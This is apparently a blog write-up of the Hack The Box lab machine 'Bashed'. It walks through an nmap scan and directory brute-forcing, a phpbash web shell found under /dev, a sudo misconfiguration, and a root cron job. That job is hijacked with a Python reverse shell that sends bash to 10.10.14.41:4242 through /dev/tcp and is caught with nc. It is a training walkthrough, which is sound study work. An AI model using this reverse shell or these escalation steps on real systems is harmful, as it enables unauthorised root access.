---

title: 🟢 HTB - Bashed
author: Acivik
date: 2025-01-24 13:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Bashed, walkthrough, easy, linux]

---

![https://i.ibb.co/bQBbLSk/Bashed.png](https://i.ibb.co/bQBbLSk/Bashed.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

Nmap discovers that only port 80 (HTTP) is open as a result.

```bash
root@kali:~/HTB/bashed# nmap -p80 10.10.10.68 -sVC --min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 11:55 UTC
Nmap scan report for 10.10.10.68 (10.10.10.68)
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
root@kali:~/HTB/bashed#
```

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">WebSite</span>

This page contains writings about phpbash.

![https://i.ibb.co/sPNCF9Z/Ekran-g-r-nt-s-2025-01-14-161117.png](https://i.ibb.co/sPNCF9Z/Ekran-g-r-nt-s-2025-01-14-161117.png)

Let's perform file and directory scanning for further discovery.

### <span style="color:#FFC300">Directory BruteForce</span>

```bash
root@kali:~/HTB/bashed# dirsearch -u http://10.10.10.68/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/HTB/bashed/reports/http_10.10.10.68/__25-01-14_11-57-57.txt

Target: http://10.10.10.68/

[11:57:57] Starting: 
[11:57:59] 301 -  307B  - /js  ->  http://10.10.10.68/js/
[11:58:03] 403 -  297B  - /.ht_wsr.txt
[11:58:03] 403 -  300B  - /.htaccess.save
[11:58:03] 403 -  300B  - /.htaccess.bak1
[11:58:03] 403 -  300B  - /.htaccess.orig
[11:58:03] 403 -  302B  - /.htaccess.sample
[11:58:03] 403 -  301B  - /.htaccess_extra
[11:58:03] 403 -  300B  - /.htaccess_orig
[11:58:03] 403 -  298B  - /.htaccess_sc
[11:58:03] 403 -  298B  - /.htaccessBAK
[11:58:03] 403 -  299B  - /.htaccessOLD2
[11:58:03] 403 -  298B  - /.htaccessOLD
[11:58:03] 403 -  290B  - /.htm
[11:58:03] 403 -  296B  - /.htpasswds
[11:58:03] 403 -  300B  - /.htpasswd_test
[11:58:03] 403 -  297B  - /.httr-oauth
[11:58:03] 403 -  291B  - /.html
[11:58:03] 301 -  308B  - /php  ->  http://10.10.10.68/php/
[11:58:04] 403 -  290B  - /.php
[11:58:04] 403 -  291B  - /.php3
[11:58:10] 200 -    2KB - /about.html
[11:58:29] 200 -    0B  - /config.php
[11:58:30] 200 -    2KB - /contact.html
[11:58:31] 301 -  308B  - /css  ->  http://10.10.10.68/css/
[11:58:32] 301 -  308B  - /dev  ->  http://10.10.10.68/dev/
[11:58:32] 200 -  479B  - /dev/
[11:58:37] 301 -  310B  - /fonts  ->  http://10.10.10.68/fonts/
[11:58:40] 301 -  311B  - /images  ->  http://10.10.10.68/images/
[11:58:40] 200 -  513B  - /images/
[11:58:43] 200 -  660B  - /js/
[11:58:54] 200 -  454B  - /php/
[11:59:02] 403 -  300B  - /server-status/
[11:59:02] 403 -  299B  - /server-status
[11:59:12] 301 -  312B  - /uploads  ->  http://10.10.10.68/uploads/
[11:59:13] 200 -   14B  - /uploads/

Task Completed
root@kali:~/HTB/bashed#
```

The /dev/ directory got my attention in the scan.

# <span style="color:#AA0E1C"><b># Foothold - Shell as www-data</b>

a php bash shell is found under the /dev directory.

![https://i.ibb.co/Y4CVxDW/Ekran-g-r-nt-s-2025-01-14-153923.png](https://i.ibb.co/Y4CVxDW/Ekran-g-r-nt-s-2025-01-14-153923.png)

We can execute commands through the PHP shell file.

# <span style="color:#AA0E1C"><b># Privilege Escalation: www-data → scriptmanager</b></span>

The first thing that comes to mind is to check the sudo -l command.

```bash
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/home/arrexel$
```

With the sudo command, we can run everything as scriptmanager.

```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
scriptmanager@bashed:/home/arrexel$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: scriptmanager → root</b></span>

```bash
2025/01/14 04:54:01 CMD: UID=0     PID=17029  | python test.py 
2025/01/14 04:54:01 CMD: UID=0     PID=17028  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2025/01/14 04:54:01 CMD: UID=0     PID=17027  | /usr/sbin/CRON -f 
```

I transferred the `pspy` tool to the target machine to view the processes.

Python files under the /scripts folder are being executed by root at regular intervals.

```bash
scriptmanager@bashed:/scripts$ nano test.py
scriptmanager@bashed:/scripts$ cat test.py 
import os
os.system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.41/4242 <&1'")
scriptmanager@bashed:/scripts$
```

I inserted reverse shell code into the Python file.

```bash
root@kali:~/HTB/bashed# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.68] 56800
bash: cannot set terminal process group (17078): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts#
```